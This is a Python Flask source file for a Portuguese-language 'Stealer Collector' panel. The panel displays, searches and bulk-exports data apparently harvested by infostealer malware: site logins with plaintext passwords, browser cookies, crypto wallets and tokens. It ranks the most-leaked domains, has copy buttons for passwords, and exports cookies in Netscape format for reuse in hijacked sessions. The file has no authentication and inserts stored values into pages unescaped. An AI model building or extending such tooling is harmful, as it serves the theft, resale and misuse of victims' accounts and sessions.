#!/usr/bin/env python3
"""
stealer-collector Web Interface
================================
Servidor web para visualizar, buscar e exportar logs coletados.
"""

import os
import sys
import json
import sqlite3
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, Response, g
from werkzeug.middleware.proxy_fix import ProxyFix

from config import DB_PATH

app = Flask(__name__)
app.config['DB_PATH'] = str(DB_PATH)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)


def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(app.config['DB_PATH'])
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def close_db(exc):
    db = g.pop('db', None)
    if db is not None:
        db.close()


# =============================================================================
# HTML FRAGMENTS
# =============================================================================

PAGE_HEAD = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ Stealer Collector</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0e14;
            --card: #0f141c;
            --border: #1a2332;
            --accent: #00ff9f;
            --accent2: #ff0080;
            --text: #c8d3e0;
            --muted: #5a6a7a;
            --danger: #ff4757;
            --warning: #ffa502;
        }
        * { box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
            margin: 0;
            min-height: 100vh;
        }
        .navbar {
            background: var(--card);
            border-bottom: 1px solid var(--border);
            padding: 12px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .navbar-brand {
            color: var(--accent);
            font-weight: bold;
            font-size: 1.3rem;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .navbar-brand:hover { color: var(--accent); }
        .nav-links { display: flex; gap: 8px; flex-wrap: wrap; }
        .nav-links a {
            color: var(--text);
            text-decoration: none;
            padding: 8px 16px;
            border-radius: 6px;
            transition: all 0.2s;
            font-size: 0.9rem;
        }
        .nav-links a:hover {
            background: var(--border);
            color: var(--accent);
        }
        .nav-links a.active {
            background: var(--accent);
            color: var(--bg);
        }
        .container-fluid { padding: 24px; max-width: 1600px; margin: 0 auto; }
        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: linear-gradient(135deg, var(--card) 0%, #0d1218 100%);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 24px;
            text-align: center;
            transition: transform 0.2s, border-color 0.2s;
        }
        .stat-card:hover {
            transform: translateY(-2px);
            border-color: var(--accent);
        }
        .stat-value {
            font-size: 2.2rem;
            font-weight: bold;
            color: var(--accent);
            margin: 8px 0;
        }
        .stat-label {
            color: var(--muted);
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .stat-icon {
            font-size: 1.8rem;
            color: var(--accent2);
        }
        .table {
            color: var(--text);
            width: 100%;
        }
        .table thead th {
            border-bottom: 2px solid var(--border);
            color: var(--accent);
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            padding: 12px;
        }
        .table td {
            border-bottom: 1px solid var(--border);
            padding: 10px 12px;
            font-size: 0.85rem;
            vertical-align: middle;
        }
        .table tr:hover { background: rgba(0,255,159,0.04); }
        .search-box {
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            padding: 12px 16px;
            font-size: 1rem;
            width: 100%;
            transition: border-color 0.2s;
        }
        .search-box:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(0,255,159,0.1);
        }
        .search-box::placeholder { color: var(--muted); }
        .btn-custom {
            background: var(--accent);
            color: var(--bg);
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
        }
        .btn-custom:hover { opacity: 0.85; }
        .btn-export {
            background: var(--accent2);
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 0.85rem;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .btn-export:hover { opacity: 0.85; color: white; }
        .badge-domain {
            background: rgba(0,255,159,0.15);
            color: var(--accent);
            padding: 3px 10px;
            border-radius: 4px;
            font-size: 0.75rem;
        }
        .password-cell {
            color: var(--warning);
            font-family: monospace;
            cursor: pointer;
        }
        .password-cell.hidden { color: var(--muted); }
        .url-cell {
            color: #6c9eff;
            word-break: break-all;
        }
        .user-cell { color: var(--accent); }
        .pagination-info {
            color: var(--muted);
            font-size: 0.85rem;
            margin-top: 16px;
        }
        .empty-state {
            text-align: center;
            padding: 60px;
            color: var(--muted);
        }
        .empty-state i { font-size: 3rem; margin-bottom: 16px; display: block; }
        select.search-box { cursor: pointer; }
        .copy-btn {
            background: none;
            border: 1px solid var(--border);
            color: var(--muted);
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 0.7rem;
            cursor: pointer;
            transition: all 0.2s;
        }
        .copy-btn:hover { color: var(--accent); border-color: var(--accent); }
        .glow { text-shadow: 0 0 10px rgba(0,255,159,0.5); }
        .pass-val { color: var(--warning); font-family: monospace; word-break: break-all; }
        @media (max-width: 768px) {
            .navbar { flex-direction: column; gap: 10px; }
            .nav-links { flex-wrap: wrap; justify-content: center; }
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <a class="navbar-brand glow" href="/">
            <i class="bi bi-lightning-charge-fill"></i> Stealer Collector
        </a>
        <div class="nav-links">
            <a href="/" class="__ACTIVE_DASHBOARD__">Dashboard</a>
            <a href="/credentials" class="__ACTIVE_CREDS__">Credenciais</a>
            <a href="/cookies" class="__ACTIVE_CREDS__">Cookies</a>
            <a href="/domains" class="__ACTIVE_DOMAINS__">Domínios</a>
            <a href="/logs" class="__ACTIVE_LOGS__">Logs</a>
            <a href="/api/stats" target="_blank">API</a>
        </div>
    </nav>
    <div class="container-fluid">
        __CONTENT__
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
    function copyText(text, btn) {
        navigator.clipboard.writeText(text);
        if (btn) {
            const orig = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check"></i>';
            setTimeout(() => btn.innerHTML = orig, 1000);
        }
    }
    function togglePass(el) {
        if (el.classList.contains('hidden')) {
            el.classList.remove('hidden');
            el.innerText = el.dataset.pass;
        } else {
            el.classList.add('hidden');
            el.innerText = '\\u2022\\u2022\\u2022\\u2022\\u2022';
        }
    }
    </script>
</body>
</html>"""


def render_page(content, active=''):
    html = PAGE_HEAD.replace('__CONTENT__', content)
    # Set active nav
    html = html.replace('__ACTIVE_DASHBOARD__', 'active' if active == 'dashboard' else '')
    html = html.replace('__ACTIVE_CREDS__', 'active' if active == 'creds' else '')
    html = html.replace('__ACTIVE_DOMAINS__', 'active' if active == 'domains' else '')
    html = html.replace('__ACTIVE_LOGS__', 'active' if active == 'logs' else '')
    return html


def domain_extract_sql():
    return """
        CASE 
            WHEN url LIKE 'http://%' THEN SUBSTR(url, 8, INSTR(SUBSTR(url, 8) || '/', '/') - 1)
            WHEN url LIKE 'https://%' THEN SUBSTR(url, 9, INSTR(SUBSTR(url, 9) || '/', '/') - 1)
            WHEN url LIKE 'www.%' THEN SUBSTR(url, 5, INSTR(SUBSTR(url, 5) || '/', '/') - 1)
            ELSE SUBSTR(url, 1, INSTR(url || '/', '/') - 1)
        END
    """


# =============================================================================
# ROUTES
# =============================================================================

@app.route('/')
def dashboard():
    db = get_db()
    stats = dict(db.execute("""
        SELECT
            (SELECT COUNT(*) FROM raw_logs) as total_logs,
            (SELECT COUNT(*) FROM credentials) as total_creds,
            (SELECT COUNT(DISTINCT url) FROM credentials WHERE url IS NOT NULL) as unique_urls,
            (SELECT COUNT(DISTINCT username) FROM credentials) as unique_users,
            (SELECT COUNT(*) FROM cookies) as total_cookies,
            (SELECT COUNT(DISTINCT domain) FROM cookies) as unique_domains,
            (SELECT COUNT(*) FROM wallets) as total_wallets,
            (SELECT COUNT(*) FROM tokens) as total_tokens
    """).fetchone())

    top_domains = db.execute(f"""
        SELECT 
            {domain_extract_sql()} as domain,
            COUNT(*) as count
        FROM credentials 
        WHERE url IS NOT NULL AND url != ''
        GROUP BY domain
        ORDER BY count DESC
        LIMIT 20
    """).fetchall()

    recent_logs = db.execute(
        "SELECT * FROM raw_logs ORDER BY id DESC LIMIT 15"
    ).fetchall()

    content = f"""
<div class="row g-3 mb-4">
    <div class="col-md-3 col-sm-6"><div class="stat-card">
        <div class="stat-icon"><i class="bi bi-key-fill"></i></div>
        <div class="stat-value">{stats['total_creds']}</div><div class="stat-label">Credenciais</div>
    </div></div>
    <div class="col-md-3 col-sm-6"><div class="stat-card">
        <div class="stat-icon"><i class="bi bi-file-earmark-lock"></i></div>
        <div class="stat-value">{stats['total_cookies']}</div><div class="stat-label">Cookies</div>
    </div></div>
    <div class="col-md-3 col-sm-6"><div class="stat-card">
        <div class="stat-icon"><i class="bi bi-globe"></i></div>
        <div class="stat-value">{stats['unique_urls']}</div><div class="stat-label">URLs Únicas</div>
    </div></div>
    <div class="col-md-3 col-sm-6"><div class="stat-card">
        <div class="stat-icon"><i class="bi bi-database"></i></div>
        <div class="stat-value">{stats['total_logs']}</div><div class="stat-label">Logs Coletados</div>
    </div></div>
    <div class="col-md-3 col-sm-6"><div class="stat-card">
        <div class="stat-icon"><i class="bi bi-person-fill"></i></div>
        <div class="stat-value">{stats['unique_users']}</div><div class="stat-label">Usuários Únicos</div>
    </div></div>
    <div class="col-md-3 col-sm-6"><div class="stat-card">
        <div class="stat-icon"><i class="bi bi-diagram-3"></i></div>
        <div class="stat-value">{stats['unique_domains']}</div><div class="stat-label">Domínios</div>
    </div></div>
    <div class="col-md-3 col-sm-6"><div class="stat-card">
        <div class="stat-icon"><i class="bi bi-wallet2"></i></div>
        <div class="stat-value">{stats['total_wallets']}</div><div class="stat-label">Wallets</div>
    </div></div>
    <div class="col-md-3 col-sm-6"><div class="stat-card">
        <div class="stat-icon"><i class="bi bi-ticket"></i></div>
        <div class="stat-value">{stats['total_tokens']}</div><div class="stat-label">Tokens</div>
    </div></div>
</div>

<div class="card">
    <h4 style="color:var(--accent)"><i class="bi bi-fire"></i> Top 20 Domínios Mais Vazados</h4>
    <table class="table">
        <thead><tr><th>#</th><th>Domínio</th><th>Credenciais</th><th>Ação</th></tr></thead>
        <tbody>"""
    for i, d in enumerate(top_domains, 1):
        content += f"""
        <tr>
            <td>{i}</td>
            <td><span class="badge-domain">{d['domain']}</span></td>
            <td>{d['count']}</td>
            <td><a href="/credentials?domain={d['domain']}" class="btn-export" style="font-size:0.75rem;padding:4px 12px">Ver</a></td>
        </tr>"""
    content += f"""
        </tbody>
    </table>
</div>

<div class="card">
    <h4 style="color:var(--accent)"><i class="bi bi-clock-history"></i> Logs Recentes</h4>
    <table class="table">
        <thead><tr><th>ID</th><th>Fonte</th><th>Canal</th><th>Arquivo</th><th>Tamanho</th><th>Data</th><th>Ver</th></tr></thead>
        <tbody>"""
    for l in recent_logs:
        content += f"""
        <tr>
            <td>{l['id']}</td>
            <td>{(l['source'] or '-')[:30]}</td>
            <td>{(l['channel'] or '-')[:25]}</td>
            <td>{(l['file_name'] or '-')[:40]}</td>
            <td>{l['file_size'] or 0}</td>
            <td>{(l['collected_at'] or '')[:19]}</td>
            <td><a href="/log/{l['id']}" class="btn-export" style="font-size:0.75rem;padding:4px 10px">Ver</a></td>
        </tr>"""
    content += """
        </tbody>
    </table>
</div>"""
    return render_page(content, 'dashboard')


@app.route('/credentials')
def credentials():
    db = get_db()
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 50, type=int)
    query = request.args.get('q', '')
    domain = request.args.get('domain', '')
    per_page = min(per_page, 500)

    sql = "SELECT * FROM credentials WHERE 1=1"
    count_sql = "SELECT COUNT(*) as cnt FROM credentials WHERE 1=1"
    params = []

    if query:
        sql += " AND (username LIKE ? OR password LIKE ? OR url LIKE ?)"
        count_sql += " AND (username LIKE ? OR password LIKE ? OR url LIKE ?)"
        p = f"%{query}%"
        params.extend([p, p, p])
    if domain:
        sql += " AND url LIKE ?"
        count_sql += " AND url LIKE ?"
        params.append(f"%{domain}%")

    total = db.execute(count_sql, params).fetchone()['cnt']
    total_pages = max(1, (total + per_page - 1) // per_page)
    offset = (page - 1) * per_page

    sql += " ORDER BY id DESC LIMIT ? OFFSET ?"
    creds = db.execute(sql, params + [per_page, offset]).fetchall()

    domains = db.execute(f"""
        SELECT {domain_extract_sql()} as domain, COUNT(*) as count
        FROM credentials WHERE url IS NOT NULL AND url != ''
        GROUP BY domain ORDER BY count DESC LIMIT 200
    """).fetchall()

    # Build query string for pagination
    qs_parts = []
    if query: qs_parts.append(f'q={query}')
    if domain: qs_parts.append(f'domain={domain}')
    if per_page != 50: qs_parts.append(f'per_page={per_page}')
    qs = '&'.join(qs_parts)
    qs_with_page = qs + ('&' if qs else '') + f'per_page={per_page}'
    export_qs = '?' + qs if qs else ''

    content = f"""
<div class="card">
    <div class="row mb-3">
        <div class="col-md-5">
            <input type="text" class="search-box" id="search" placeholder="Buscar por usuário, senha, URL..." value="{query}">
        </div>
        <div class="col-md-4">
            <select class="search-box" id="domainFilter">
                <option value="">Todos os domínios</option>"""
    for d in domains:
        selected = 'selected' if domain == d['domain'] else ''
        content += f'<option value="{d["domain"]}" {selected}>{d["domain"]} ({d["count"]})</option>'
    content += f"""
            </select>
        </div>
        <div class="col-md-2">
            <select class="search-box" id="perPage">
                <option value="50" {'selected' if per_page==50 else ''}>50 por página</option>
                <option value="100" {'selected' if per_page==100 else ''}>100 por página</option>
                <option value="200" {'selected' if per_page==200 else ''}>200 por página</option>
                <option value="500" {'selected' if per_page==500 else ''}>500 por página</option>
            </select>
        </div>
        <div class="col-md-1">
            <button class="btn-custom w-100" onclick="doSearch()"><i class="bi bi-search"></i></button>
        </div>
    </div>
    <div class="text-end mt-2">
        <a href="/api/export/creds{export_qs}" class="btn-export"><i class="bi bi-download"></i> Exportar JSON</a>
        <a href="/api/export/creds_csv{export_qs}" class="btn-export" style="background:var(--accent)"><i class="bi bi-filetype-csv"></i> Exportar CSV</a>
    </div>
</div>

<div class="card">"""
    if creds:
        content += f"""
    <table class="table">
        <thead><tr><th>#</th><th>URL</th><th>Usuário</th><th>Senha</th><th>App</th><th>Copiar</th></tr></thead>
        <tbody>"""
        for c in creds:
            url_display = (c['url'] or '')[:60] + ('...' if len(c['url'] or '') > 60 else '')
            user_display = (c['username'] or '')[:40]
            pw = (c['password'] or '').replace("'", "\\'").replace('"', '"')
            app = c['application'] or '-'
            content += f"""
        <tr>
            <td>{offset + creds.index(c) + 1}</td>
            <td class="url-cell" style="max-width:300px">{url_display}</td>
            <td class="user-cell">{user_display}</td>
            <td class="password-cell hidden" data-pass="{pw}" onclick="togglePass(this)">&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;</td>
            <td>{app}</td>
            <td><button class="copy-btn" onclick="copyText('{pw}', this)"><i class="bi bi-clipboard"></i></button></td>
        </tr>"""
        content += f"""
        </tbody>
    </table>
    <div class="pagination-info text-center">
        Mostrando {offset + 1}-{offset + len(creds)} de {total} credenciais<br>
"""
        if page > 1:
            content += f'<a href="/credentials?page={page-1}&{qs}" class="btn-export" style="margin:5px">&larr; Anterior</a> '
        content += f'Página {page} de {total_pages}'
        if page < total_pages:
            content += f' <a href="/credentials?page={page+1}&{qs}" class="btn-export" style="margin:5px">Próxima &rarr;</a>'
        content += "</div>"
    else:
        content += """
        <div class="empty-state">
            <i class="bi bi-search"></i>
            <h4>Nenhuma credencial encontrada</h4>
            <p>Tente outra busca</p>
        </div>"""
    content += """
</div>
<script>
function doSearch() {
    const q = document.getElementById('search').value;
    const d = document.getElementById('domainFilter').value;
    const pp = document.getElementById('perPage').value;
    let url = '/credentials?page=1';
    if (q) url += '&q=' + encodeURIComponent(q);
    if (d) url += '&domain=' + encodeURIComponent(d);
    url += '&per_page=' + pp;
    window.location.href = url;
}
document.getElementById('search').addEventListener('keypress', e => {
    if (e.key === 'Enter') doSearch();
});
</script>"""
    return render_page(content, 'creds')


@app.route('/cookies')
def cookies():
    db = get_db()
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 50, type=int)
    domain = request.args.get('domain', '')
    per_page = min(per_page, 500)

    sql = "SELECT * FROM cookies WHERE 1=1"
    count_sql = "SELECT COUNT(*) as cnt FROM cookies WHERE 1=1"
    params = []

    if domain:
        sql += " AND domain LIKE ?"
        count_sql += " AND domain LIKE ?"
        params.append(f"%{domain}%")

    total = db.execute(count_sql, params).fetchone()['cnt']
    total_pages = max(1, (total + per_page - 1) // per_page)
    offset = (page - 1) * per_page

    sql += " ORDER BY id DESC LIMIT ? OFFSET ?"
    cookies = db.execute(sql, params + [per_page, offset]).fetchall()

    export_qs = f'?domain={domain}' if domain else ''

    content = f"""
<div class="card">
    <div class="row mb-3">
        <div class="col-md-8">
            <input type="text" class="search-box" id="search" placeholder="Buscar cookies por domínio..." value="{domain}">
        </div>
        <div class="col-md-2">
            <button class="btn-custom w-100" onclick="doSearch()"><i class="bi bi-search"></i> Buscar</button>
        </div>
        <div class="col-md-2 text-end">
            <a href="/api/export/cookies{export_qs}" class="btn-export"><i class="bi bi-download"></i> Exportar</a>
        </div>
    </div>
</div>
<div class="card">"""
    if cookies:
        content += f"""
    <table class="table">
        <thead><tr><th>#</th><th>Domínio</th><th>Nome</th><th>Valor</th><th>Path</th><th>Copiar</th></tr></thead>
        <tbody>"""
        for c in cookies:
            val_display = (c['value'] or '')[:60] + ('...' if len(c['value'] or '') > 60 else '')
            content += f"""
        <tr>
            <td>{offset + list(cookies).index(c) + 1}</td>
            <td><span class="badge-domain">{c['domain']}</span></td>
            <td>{c['name']}</td>
            <td class="pass-val" style="max-width:300px">{val_display}</td>
            <td>{c['path'] or '-'}</td>
            <td><button class="copy-btn" onclick="copyText('{(c['value'] or '').replace(chr(39), chr(92)+chr(39))[:200]}', this)"><i class="bi bi-clipboard"></i></button></td>
        </tr>"""
        content += f"""
        </tbody>
    </table>
    <div class="pagination-info text-center">
        Mostrando {offset + 1}-{offset + len(cookies)} de {total} cookies<br>"""
        if page > 1:
            content += f'<a href="/cookies?page={page-1}&{f"domain={domain}&" if domain else ""}" class="btn-export" style="margin:5px">&larr; Anterior</a> '
        content += f'Página {page} de {total_pages}'
        if page < total_pages:
            content += f' <a href="/cookies?page={page+1}&{f"domain={domain}&" if domain else ""}" class="btn-export" style="margin:5px">Próxima &rarr;</a>'
        content += "</div>"
    else:
        content += """
        <div class="empty-state">
            <i class="bi bi-cookie"></i>
            <h4>Nenhum cookie encontrado</h4>
        </div>"""
    content += """
</div>
<script>
function doSearch() {
    const d = document.getElementById('search').value;
    window.location.href = 'cookies?page=1' + (d ? '&domain=' + encodeURIComponent(d) : '');
}
document.getElementById('search').addEventListener('keypress', e => {
    if (e.key === 'Enter') doSearch();
});
</script>"""
    return render_page(content, 'cookies')


@app.route('/domains')
def domains():
    db = get_db()
    domains = db.execute(f"""
        SELECT 
            {domain_extract_sql()} as domain,
            COUNT(*) as cred_count
        FROM credentials
        WHERE url IS NOT NULL AND url != ''
        GROUP BY domain
        ORDER BY cred_count DESC
        LIMIT 500
    """).fetchall()

    # Get cookie counts per domain
    cookie_counts = {}
    for cc in db.execute("SELECT domain, COUNT(*) as cnt FROM cookies GROUP BY domain").fetchall():
        cookie_counts[cc['domain']] = cc['cnt']

    content = f"""
<div class="card">
    <h4 style="color:var(--accent)"><i class="bi bi-globe2"></i> Todos os Domínios ({len(domains)})</h4>
    <table class="table">
        <thead><tr><th>#</th><th>Domínio</th><th>Credenciais</th><th>Cookies</th><th>Ação</th></tr></thead>
        <tbody>"""
    for i, d in enumerate(domains, 1):
        ck_count = 0
        for ck_domain, ck_cnt in cookie_counts.items():
            if d['domain'] in (ck_domain or ''):
                ck_count += ck_cnt
        content += f"""
        <tr>
            <td>{i}</td>
            <td><span class="badge-domain">{d['domain']}</span></td>
            <td>{d['cred_count']}</td>
            <td>{ck_count}</td>
            <td><a href="/credentials?domain={d['domain']}" class="btn-export" style="font-size:0.75rem;padding:4px 12px">Ver Creds</a></td>
        </tr>"""
    content += """
        </tbody>
    </table>
</div>"""
    return render_page(content, 'domains')


@app.route('/logs')
def logs():
    db = get_db()
    page = request.args.get('page', 1, type=int)
    per_page = 50

    total = db.execute("SELECT COUNT(*) as cnt FROM raw_logs").fetchone()['cnt']
    total_pages = max(1, (total + per_page - 1) // per_page)
    offset = (page - 1) * per_page

    logs = db.execute(
        "SELECT * FROM raw_logs ORDER BY id DESC LIMIT ? OFFSET ?",
        (per_page, offset)
    ).fetchall()

    content = f"""
<div class="card">
    <h4 style="color:var(--accent)"><i class="bi bi-database-fill"></i> Logs Coletados ({total})</h4>
    <table class="table">
        <thead><tr><th>ID</th><th>Fonte</th><th>Canal</th><th>Arquivo</th><th>Tamanho</th><th>Parsed</th><th>Data</th><th>Ver</th></tr></thead>
        <tbody>"""
    for l in logs:
        parsed = '<span style="color:var(--accent)">&#x2713;</span>' if l['parsed'] else '<span style="color:var(--danger)">&#x2717;</span>'
        content += f"""
        <tr>
            <td>{l['id']}</td>
            <td>{(l['source'] or '-')[:30]}</td>
            <td>{(l['channel'] or '-')[:25]}</td>
            <td>{(l['file_name'] or '-')[:40]}</td>
            <td>{l['file_size'] or 0}</td>
            <td>{parsed}</td>
            <td>{(l['collected_at'] or '')[:19]}</td>
            <td><a href="/log/{l['id']}" class="btn-export" style="font-size:0.75rem;padding:4px 10px">Ver</a></td>
        </tr>"""
    content += f"""
        </tbody>
    </table>
    <div class="pagination-info text-center">"""
    if page > 1:
        content += f'<a href="/logs?page={page-1}" class="btn-export" style="margin:5px">&larr; Anterior</a> '
    content += f'Página {page} de {total_pages}'
    if page < total_pages:
        content += f' <a href="/logs?page={page+1}" class="btn-export" style="margin:5px">Próxima &rarr;</a>'
    content += "</div></div>"
    return render_page(content, 'logs')


@app.route('/log/<int:log_id>')
def log_detail(log_id):
    db = get_db()
    log = db.execute("SELECT * FROM raw_logs WHERE id = ?", (log_id,)).fetchone()
    if not log:
        return "Log não encontrado", 404

    creds = db.execute("SELECT * FROM credentials WHERE raw_log_id = ?", (log_id,)).fetchall()
    cookies = db.execute("SELECT * FROM cookies WHERE raw_log_id = ?", (log_id,)).fetchall()

    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Log #{log_id}</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
<style>
body {{ background: #0a0e14; color: #c8d3e0; font-family: monospace; padding: 20px; }}
h2 {{ color: #00ff9f; }} h3 {{ color: #ff0080; margin-top: 20px; }}
pre {{ background: #0f141c; border: 1px solid #1a2332; border-radius: 8px; padding: 16px; overflow-x: auto; color: #c8d3e0; }}
table {{ width: 100%; color: #c8d3e0; }}
td {{ border-bottom: 1px solid #1a2332; padding: 8px; }}
.url {{ color: #6c9eff; }} .user {{ color: #00ff9f; }} .pass {{ color: #ffa502; }}
a {{ color: #00ff9f; }}
</style></head><body>
<h2><i class="bi bi-file-earmark-code"></i> Log #{log_id}</h2>
<p>Fonte: {log['source']} | Canal: {log['channel'] or '-'} | Arquivo: {log['file_name'] or '-'} | Data: {(log['collected_at'] or '')[:19]}</p>
"""
    if creds:
        html += f"<h3>Credenciais ({len(creds)})</h3><table><tr><th>URL</th><th>User</th><th>Pass</th></tr>"
        for c in creds:
            html += f"<tr><td class='url'>{c['url'] or ''}</td><td class='user'>{c['username'] or ''}</td><td class='pass'>{c['password'] or ''}</td></tr>"
        html += "</table>"

    if cookies:
        html += f"<h3>Cookies ({len(cookies)})</h3><table><tr><th>Domain</th><th>Name</th><th>Value</th></tr>"
        for c in cookies[:50]:
            html += f"<tr><td>{c['domain'] or ''}</td><td>{c['name'] or ''}</td><td style='color:#ffa502'>{(c['value'] or '')[:60]}</td></tr>"
        if len(cookies) > 50:
            html += f"<tr><td colspan=3>... e mais {len(cookies)-50} cookies</td></tr>"
        html += "</table>"

    raw_content = (log['raw_content'] or '')[:5000].replace('<', '<').replace('>', '>')
    html += f"<h3>Conteúdo Raw</h3><pre>{raw_content}</pre>"
    html += '<br><a href="/logs">&larr; Voltar</a></body></html>'
    return html


# =============================================================================
# API EXPORT
# =============================================================================

@app.route('/api/export/creds')
def export_creds_json():
    db = get_db()
    query = request.args.get('q', '')
    domain = request.args.get('domain', '')
    limit = request.args.get('limit', 10000, type=int)

    sql = "SELECT * FROM credentials WHERE 1=1"
    params = []
    if query:
        sql += " AND (username LIKE ? OR password LIKE ? OR url LIKE ?)"
        p = f"%{query}%"
        params.extend([p, p, p])
    if domain:
        sql += " AND url LIKE ?"
        params.append(f"%{domain}%")
    sql += " ORDER BY id DESC LIMIT ?"
    params.append(limit)

    rows = db.execute(sql, params).fetchall()
    data = [dict(r) for r in rows]
    return Response(
        json.dumps(data, indent=2, default=str),
        mimetype='application/json',
        headers={'Content-Disposition': f'attachment; filename=creds_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'}
    )


@app.route('/api/export/creds_csv')
def export_creds_csv():
    db = get_db()
    query = request.args.get('q', '')
    domain = request.args.get('domain', '')
    limit = request.args.get('limit', 10000, type=int)

    sql = "SELECT url, username, password, application FROM credentials WHERE 1=1"
    params = []
    if query:
        sql += " AND (username LIKE ? OR password LIKE ? OR url LIKE ?)"
        p = f"%{query}%"
        params.extend([p, p, p])
    if domain:
        sql += " AND url LIKE ?"
        params.append(f"%{domain}%")
    sql += " ORDER BY id DESC LIMIT ?"
    params.append(limit)

    rows = db.execute(sql, params).fetchall()
    csv = "url,username,password,application\n"
    for r in rows:
        url = (r['url'] or '').replace(',', ';')
        user = (r['username'] or '').replace(',', ';')
        pw = (r['password'] or '').replace(',', ';')
        app = (r['application'] or '').replace(',', ';')
        csv += f"{url},{user},{pw},{app}\n"

    return Response(
        csv,
        mimetype='text/csv',
        headers={'Content-Disposition': f'attachment; filename=creds_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'}
    )


@app.route('/api/export/cookies')
def export_cookies():
    db = get_db()
    domain = request.args.get('domain', '')
    limit = request.args.get('limit', 10000, type=int)

    sql = "SELECT domain, name, value, path, expires FROM cookies WHERE 1=1"
    params = []
    if domain:
        sql += " AND domain LIKE ?"
        params.append(f"%{domain}%")
    sql += " ORDER BY id DESC LIMIT ?"
    params.append(limit)

    rows = db.execute(sql, params).fetchall()
    txt = "# Netscape HTTP Cookie File\n"
    for r in rows:
        d = r['domain'] or ''
        n = r['name'] or ''
        v = r['value'] or ''
        p = r['path'] or '/'
        e = r['expires'] or '0'
        secure = 'TRUE' if d.startswith('.') else 'FALSE'
        txt += f"{d}\tTRUE\t{p}\t{secure}\t{e}\t{n}\t{v}\n"

    return Response(
        txt,
        mimetype='text/plain',
        headers={'Content-Disposition': f'attachment; filename=cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'}
    )


@app.route('/api/stats')
def api_stats():
    db = get_db()
    stats = dict(db.execute("""
        SELECT
            (SELECT COUNT(*) FROM raw_logs) as total_logs,
            (SELECT COUNT(*) FROM credentials) as total_creds,
            (SELECT COUNT(DISTINCT url) FROM credentials WHERE url IS NOT NULL) as unique_urls,
            (SELECT COUNT(DISTINCT username) FROM credentials) as unique_users,
            (SELECT COUNT(*) FROM cookies) as total_cookies,
            (SELECT COUNT(*) FROM wallets) as total_wallets,
            (SELECT COUNT(*) FROM tokens) as total_tokens
    """).fetchone())
    return jsonify(stats)


if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
    print(f"⚡ Stealer Collector Web rodando em http://0.0.0.0:{port}")
    app.run(host='0.0.0.0', port=port, debug=False)
